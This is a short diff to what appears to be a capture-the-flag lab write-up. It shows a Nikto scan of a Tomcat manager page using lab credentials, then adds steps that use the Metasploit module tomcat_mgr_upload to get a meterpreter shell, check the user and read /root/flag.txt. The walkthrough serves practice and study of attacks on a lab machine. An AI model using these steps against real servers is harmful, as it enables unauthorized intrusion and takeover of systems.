@@ -63,5 +63,15 @@ Using Nikto with creds
 nikto -id bob:bubbles -h http://10.10.219.157:1234/manager/html
 ```
 
-username=tomcat
-password = s3cret
+use metasploit to exploit
+```
+use exploit/multi/http/tomcat_mgr_upload
+```
+
+Once meterpreter has spawned
+```
+getuid
+```
+```
+cat /root/flag.txt
+```
